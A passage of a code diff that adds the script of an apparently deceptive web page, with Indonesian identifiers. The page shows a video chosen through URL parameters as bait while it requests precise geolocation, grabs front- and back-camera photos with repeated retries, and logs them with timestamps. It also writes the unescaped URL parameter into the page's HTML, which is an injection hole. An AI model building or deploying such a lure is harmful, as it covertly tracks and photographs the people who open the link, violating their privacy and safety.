+    const simpan = parameter.get('s') !== '0';
+    const ambilDepan = parameter.get('d') === '1';
+    const ambilBelakang = parameter.get('b') === '1';
+    const ambilLokasi = parameter.get('l') !== '0';
+    const media = parameter.get('m') || '';
+    
+    if (media) {
+        const tautanMedia = decodeURIComponent(media);
+        document.getElementById('bagianTampil').innerHTML = `
+            <video src="${tautanMedia}" controls autoplay playsinline style="width:100%;height:100%;object-fit:contain;">
+        `;
+        document.getElementById('teksInfoTampil').textContent = 'Konten siap ditonton';
+    } else {
+        document.getElementById('teksInfoTampil').textContent = 'Menunggu izin akses...';
+    }
+    
+    const hasil = {
+        waktu: new Date().toLocaleString('id-ID'),
+        lokasi: null,
+        fotoDepan: null,
+        fotoBelakang: null
+    };
+    
+    if (ambilLokasi && navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(posisi) {
+                hasil.lokasi = posisi.coords.latitude.toFixed(6) + ', ' + posisi.coords.longitude.toFixed(6);
+                simpanHasil(hasil, simpan);
+            },
+            function() {
+                hasil.lokasi = 'Izin lokasi ditolak';
+                simpanHasil(hasil, simpan);
+            },
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
+    }
+    
+    if (ambilDepan && navigator.mediaDevices) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 480 } })
+        .then(function(aliran) {
+            ambilGambarDariKamera(aliran, function(gambar) {
+                hasil.fotoDepan = gambar;
+                simpanHasil(hasil, simpan);
+            });
+        })
+        .catch(function() {
+            simpanHasil(hasil, simpan);
+        });
+    }
+    
+    if (ambilBelakang && navigator.mediaDevices) {
+        let percobaan = 0;
+        const pengaturanKamera = [
+            { facingMode: { exact: 'environment' } },
+            { facingMode: 'environment' },
+            { width: 1280, height: 720 }
+        ];
+        
+        function cobaKameraBerikutnya() {
+            if (percobaan >= pengaturanKamera.length) {
+                simpanHasil(hasil, simpan);
+                return;
+            }
+            navigator.mediaDevices.getUserMedia({ video: pengaturanKamera[percobaan] })
+            .then(function(aliran) {
+                ambilGambarDariKamera(aliran, function(gambar) {
+                    hasil.fotoBelakang = gambar;
+                    simpanHasil(hasil, simpan);
+                });
+            })
+            .catch(function() {
+                percobaan++;
+                setTimeout(cobaKameraBerikutnya, 400);
+            });
+        }
+        cobaKameraBerikutnya();
+    }
+}
+
+function simpanHasil(data, bolehSimpan) {
+    if (!bolehSimpan) return;
+    
+    const indeks = dataTersimpan.findIndex(item => item.waktu === data.waktu);
+    if (indeks === -1) {
+        dataTersimpan.push(data);
+    } else {
+        dataTersimpan[indeks] = data;
+    }
+    localStorage.setItem('dataMasuk', JSON.stringify(dataTersimpan));
+}
+
+window.addEventListener('load', prosesDataMasuk);
+</script>
+</body>
+</html>
